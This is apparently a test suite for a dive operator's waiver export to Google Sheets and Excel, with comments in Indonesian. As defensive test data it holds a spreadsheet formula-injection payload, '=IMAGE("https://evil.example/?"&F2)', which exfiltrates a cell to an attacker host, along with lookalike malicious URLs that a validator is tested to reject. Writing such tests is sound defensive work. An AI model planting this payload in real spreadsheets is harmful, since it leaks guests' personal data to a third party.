import { test } from "node:test";
import assert from "node:assert/strict";
import {
  appsScript,
  cleanSheetUrl,
  excelRow,
  medicalSummary,
  SHEET_COLUMNS,
  SHEET_NAME,
  sheetColumns,
  sheetRow,
  sheetValues,
  witStamp,
} from "../src/lib/waiver-sheet.js";
import { workbook } from "../src/lib/xlsx.js";
import { runAppsScript, sheetTable } from "./helpers/fake-sheets.js";

// Formulir seperti keluaran listWaivers (src/server/waivers.js).
const waiver = (over = {}) => ({
  code: "DW-261102-ABCDE",
  order: "DD-261101-XY7Z9",
  lang: "id",
  name: "Sari Wulandari",
  birthDate: "1990-05-20",
  nationality: "Indonesia",
  email: "sari@example.com",
  phone: "+62 812 3456 7890",
  date: "2026-11-04",
  clearance: false,
  minor: false,
  createdAt: "2026-11-02T12:05:41.000Z",
  data: {
    age: 36,
    address: "Jl. Ahmad Yani 1, Sorong",
    emergency: "+62 813 1111 2222 (Budi, suami)",
    room: "Turtle 3",
    certified: true,
    certAgency: "PADI",
    certLevel: "Advanced Open Water",
    certNumber: "0012345",
    lastDive: "2026-08-01",
    loggedDives: 42,
    insurance: "yes",
    insurer: "DAN",
    guardian: "",
    medical: { q1: false, q2: false, q3: false, q4: false, q5: false, q6: false, q7: false, q8: false, q9: false, q10: false },
  },
  ...over,
});

const col = (header) => SHEET_COLUMNS.findIndex((c) => c.header === header);

test("kolom spreadsheet: judul unik, satu kolom ID, nilai sebanyak kolom", () => {
  const headers = SHEET_COLUMNS.map((c) => c.header);
  assert.equal(new Set(headers).size, headers.length);
  assert.equal(SHEET_COLUMNS.filter((c) => c.key).length, 1);
  assert.equal(SHEET_COLUMNS.find((c) => c.key).header, "ID");
  assert.equal(sheetValues(waiver()).length, SHEET_COLUMNS.length);
  for (const c of sheetColumns()) assert.ok(["text", "date", "datetime", "number", "link"].includes(c.type), c.header);
  // Kolom yang sering berisi + atau nol di depan (penyebab #ERROR! di sheet contoh pemilik) bertipe teks.
  for (const header of ["Phone", "Emergency Contact", "Cert No.", "ID", "Order"]) assert.equal(SHEET_COLUMNS[col(header)].type, "text", header);
});

test("satu formulir menjadi satu baris rapi: waktu WIT, tanggal ISO, telepon tetap teks, tautan ke admin", () => {
  const values = sheetValues(waiver(), { base: "https://dragonetdiversrajaampat.com/" });
  const get = (header) => values[col(header)];
  assert.equal(get("Timestamp (WIT)"), "2026-11-02 21:05");
  assert.equal(get("ID"), "DW-261102-ABCDE");
  assert.equal(get("Dive Date"), "2026-11-04");
  assert.equal(get("Date of Birth"), "1990-05-20");
  assert.equal(get("Phone"), "+62 812 3456 7890");
  assert.equal(get("Emergency Contact"), "+62 813 1111 2222 (Budi, suami)");
  assert.equal(get("Cert No."), "0012345");
  assert.equal(get("Age"), 36);
  assert.equal(get("Total Dives"), 42);
  assert.equal(get("Certified"), "Yes");
  assert.equal(get("Insurance"), "Yes");
  assert.equal(get("Under 18"), "No");
  assert.equal(get("Medical"), "All NO");
  assert.equal(get("Doctor Clearance"), "Not needed");
  assert.equal(get("Language"), "Indonesian");
  assert.equal(get("Status"), "Signed");
  assert.equal(get("Form"), "https://dragonetdiversrajaampat.com/admin/formulir/DW-261102-ABCDE");
  // Belum bersertifikat, tanpa asuransi dan jumlah selam, di bawah 18 dengan wali.
  const kid = sheetValues(
    waiver({ minor: true, data: { ...waiver().data, certified: false, certAgency: "PADI", loggedDives: null, insurance: "", guardian: "Budi" } }),
  );
  assert.deepEqual([kid[col("Certified")], kid[col("Agency")], kid[col("Total Dives")], kid[col("Insurance")], kid[col("Under 18")], kid[col("Parent/Guardian")]], ["No", "", "", "", "Yes", "Budi"]);
  assert.equal(sheetValues(waiver(), {})[col("Form")], "", "tanpa alamat website tanpa tautan");
});

test("ringkasan medis: semua tidak, atau pertanyaan Ya dengan isi kotaknya", () => {
  assert.equal(medicalSummary({}), "All NO");
  assert.equal(medicalSummary({ q1: true, A2: true, A4: true, A1: false, q5: true }), "YES Q1 (A2, A4), Q5");
  assert.equal(medicalSummary({ q9: true }), "YES Q9");
  const row = sheetRow(waiver({ clearance: true, data: { ...waiver().data, medical: { q3: true } } }));
  assert.equal(row.alert, true);
  assert.equal(row.values[col("Doctor Clearance")], "Needed");
  assert.equal(row.id, "DW-261102-ABCDE");
});

test("waktu WIT dari waktu UTC", () => {
  assert.equal(witStamp("2026-11-02T15:30:00Z"), "2026-11-03 00:30");
  assert.equal(witStamp("bukan waktu"), "");
});

test("alamat Web app: hanya script.google.com/macros/s/…/exec", () => {
  const id = "AKfycbx1234567890abcdefghijklmnopqrstuvwxyz_-ABC";
  assert.equal(cleanSheetUrl(`https://script.google.com/macros/s/${id}/exec`), `https://script.google.com/macros/s/${id}/exec`);
  assert.equal(cleanSheetUrl(`  https://script.google.com/macros/s/${id}/exec?x=1 `), `https://script.google.com/macros/s/${id}/exec`);
  assert.equal(cleanSheetUrl(`https://script.google.com/a/macros/dragonet.com/s/${id}/exec`), `https://script.google.com/a/macros/dragonet.com/s/${id}/exec`);
  assert.equal(cleanSheetUrl(""), "");
  for (const bad of [
    `https://script.google.com/macros/s/${id}/dev`,
    `http://script.google.com/macros/s/${id}/exec`,
    `https://script.google.com.evil.example/macros/s/${id}/exec`,
    `https://evil.example/macros/s/${id}/exec`,
    "https://docs.google.com/spreadsheets/d/abc/edit",
    `https://script.google.com/macros/s/short/exec`,
    42,
  ]) {
    assert.equal(cleanSheetUrl(bad), null, String(bad));
  }
});

test("Apps Script: membuat lembar rapi, teks tetap teks, kiriman ulang menimpa baris yang sama", () => {
  const code = appsScript("rahasia-123");
  assert.ok(code.includes('const TOKEN = "rahasia-123";'));
  assert.ok(code.includes(`const SHEET_NAME = ${JSON.stringify(SHEET_NAME)};`));
  const { doPost, doGet, fake } = runAppsScript(code);
  const send = (body) => JSON.parse(doPost({ postData: { contents: JSON.stringify(body) } }).text);
  assert.deepEqual(JSON.parse(doGet().text), { ok: true, app: "dragonet-waivers" });
  assert.deepEqual(send({ token: "salah", columns: sheetColumns(), rows: [] }), { ok: false, error: "token" });
  assert.deepEqual(JSON.parse(doPost({ postData: { contents: "bukan json" } }).text), { ok: false, error: "json" });

  // Uji sambungan: tanpa baris, lembar dan judul disiapkan.
  const ready = send({ token: "rahasia-123", columns: sheetColumns(), rows: [] });
  assert.equal(ready.ok, true);
  assert.equal(ready.url, "https://docs.google.com/spreadsheets/d/FAKE/edit");
  const sheet = fake.sheets.get(SHEET_NAME);
  const width = SHEET_COLUMNS.length;
  assert.deepEqual(sheetTable(sheet, width)[0], SHEET_COLUMNS.map((c) => c.header));
  assert.deepEqual(sheet.frozen, { rows: 1, columns: 3 });
  assert.ok(sheet.filter, "filter di baris judul");
  assert.equal(sheet.banding.colors.header, "#146E7F");
  assert.equal(sheet.at(1, 1).background, "#146E7F");
  assert.equal(sheet.widths[col("Full Name") + 1], 200);
  assert.equal(sheet.at(5, col("Age") + 1).align, "center", "angka di tengah, tidak menempel ke teks di sebelahnya");

  const a = waiver();
  const b = waiver({ code: "DW-261102-FGHJK", name: '=IMAGE("https://evil.example/?"&F2)', phone: "+33 6 77 30 40 50", clearance: true, data: { ...waiver().data, medical: { q3: true } } });
  const first = send({ token: "rahasia-123", columns: sheetColumns(), rows: [a, b].map((w) => sheetRow(w, { base: "https://dragonetdiversrajaampat.com" })) });
  assert.deepEqual([first.added, first.updated], [2, 0]);
  const table = sheetTable(sheet, width);
  assert.equal(table.length, 3);
  // Telepon yang diawali + tidak menjadi #ERROR! karena format teks dipasang sebelum nilainya.
  assert.equal(table[2][col("Phone")], "+33 6 77 30 40 50");
  assert.equal(table[1][col("Emergency Contact")], "+62 813 1111 2222 (Budi, suami)");
  // Isian tamu yang berbentuk rumus ditulis sebagai teks kaya (tidak pernah dijalankan).
  assert.equal(table[2][col("Full Name")], '=IMAGE("https://evil.example/?"&F2)');
  assert.deepEqual(sheet.at(3, col("Full Name") + 1).rich, { text: '=IMAGE("https://evil.example/?"&F2)', link: "" });
  assert.deepEqual(sheet.at(3, col("Phone") + 1).rich, { text: "+33 6 77 30 40 50", link: "" });
  assert.equal(sheet.at(2, col("Email") + 1).rich, null, "teks biasa tetap nilai biasa");
  assert.equal(sheet.at(3, col("Phone") + 1).format, "@");
  assert.equal(sheet.at(2, col("Dive Date") + 1).format, "dd mmm yyyy");
  assert.equal(sheet.at(2, col("Timestamp (WIT)") + 1).format, "dd mmm yyyy hh:mm");
  // Tautan formulir, dan kolom medis berwarna untuk yang perlu dokter.
  assert.deepEqual(sheet.at(2, col("Form") + 1).rich, { text: "Open form", link: "https://dragonetdiversrajaampat.com/admin/formulir/DW-261102-ABCDE" });
  assert.equal(sheet.at(3, col("Medical") + 1).background, "#FDF4EC");
  assert.equal(sheet.at(3, col("Doctor Clearance") + 1).weight, "bold");
  assert.equal(sheet.at(2, col("Medical") + 1).background, null);

  // Kirim ulang (mis. tombol Kirim ulang semua): baris yang sama ditimpa, tidak ganda.
  const again = send({ token: "rahasia-123", columns: sheetColumns(), rows: [sheetRow({ ...b, clearance: false, data: { ...b.data, medical: {} } }), sheetRow(waiver({ code: "DW-261103-MNPQR" }))] });
  assert.deepEqual([again.added, again.updated], [1, 1]);
  const after = sheetTable(sheet, width);
  assert.equal(after.length, 4);
  assert.deepEqual(after.slice(1).map((row) => row[col("ID")]), ["DW-261102-ABCDE", "DW-261102-FGHJK", "DW-261103-MNPQR"]);
  assert.equal(after[2][col("Doctor Clearance")], "Not needed");
  assert.equal(sheet.at(3, col("Medical") + 1).background, null, "warna dilepas bila tidak perlu dokter lagi");
});

test("tiruan Google Sheets: tanpa format teks, + menjadi #ERROR! seperti sheet contoh pemilik", () => {
  const { fake } = runAppsScript(appsScript("x"));
  const sheet = fake.SpreadsheetApp.getActive().insertSheet("Contoh");
  sheet.getRange(1, 1, 1, 2).setValues([["+33 6 77 30 40", "Turtle"]]);
  assert.equal(sheet.at(1, 1).value, "#ERROR!");
});

test("Excel formulir: judul teal, baris judul dan tiga kolom menempel, filter, tanggal asli, teks bukan rumus", () => {
  const values = sheetValues(waiver({ phone: "=1+1" }), { base: "https://dragonetdiversrajaampat.com" });
  const cells = excelRow(values);
  assert.deepEqual(cells[col("Dive Date")], { date: "2026-11-04" });
  assert.deepEqual(cells[col("Timestamp (WIT)")], { datetime: "2026-11-02 21:05" });
  assert.deepEqual(cells[col("Form")], { link: "https://dragonetdiversrajaampat.com/admin/formulir/DW-261102-ABCDE", text: "Open form" });
  const book = workbook([
    {
      name: SHEET_NAME,
      brand: true,
      filter: true,
      freeze: { rows: 1, columns: 3 },
      widths: SHEET_COLUMNS.map((c) => Math.round(c.width / 7)),
      rows: [SHEET_COLUMNS.map((c) => c.header), cells.map((cell, i) => (SHEET_COLUMNS[i].alert ? { value: cell, alert: true } : cell))],
    },
  ]).toString("utf8"); // zip tanpa kompresi, isinya terbaca langsung
  assert.match(book, /<pane xSplit="3" ySplit="1" topLeftCell="D2" activePane="bottomRight" state="frozen"\/>/);
  assert.match(book, /<autoFilter ref="A1:AB2"\/>/);
  assert.match(book, /<definedName name="_xlnm\._FilterDatabase" localSheetId="0" hidden="1">'Diving Waivers'!\$A\$1:\$AB\$2<\/definedName>/);
  assert.match(book, /<c r="A1" t="inlineStr" s="4">/, "judul bergaya teal");
  assert.match(book, /<c r="E2" s="2"><v>46330<\/v><\/c>/, "tanggal selam 4 Nov 2026 sebagai tanggal Excel");
  assert.match(book, /<c r="A2" s="3"><v>46328\.87[0-9]*<\/v><\/c>/, "waktu WIT sebagai tanggal dan jam");
  assert.match(book, /<c r="G2" t="inlineStr"><is><t xml:space="preserve">=1\+1<\/t><\/is><\/c>/, "isian tamu tidak pernah jadi rumus");
  assert.match(book, /<f>HYPERLINK\(&quot;https:\/\/dragonetdiversrajaampat\.com\/admin\/formulir\/DW-261102-ABCDE&quot;,&quot;Open form&quot;\)<\/f>/);
  assert.match(book, /<c r="K2" s="7"><v>36<\/v><\/c>/, "umur di tengah");
  assert.match(book, /<c r="W2" t="inlineStr" s="6"><is><t xml:space="preserve">All NO<\/t>/, "kolom medis bergaya peringatan");
  // Lembar tanpa pilihan tetap seperti sebelumnya (judul tebal saja, tanpa filter).
  const plain = workbook([{ name: "Tamu", rows: [["Nama"], ["Sari"]] }]).toString("utf8");
  assert.match(plain, /<c r="A1" t="inlineStr" s="1">/);
  assert.doesNotMatch(plain, /autoFilter|definedName|<pane/);
});
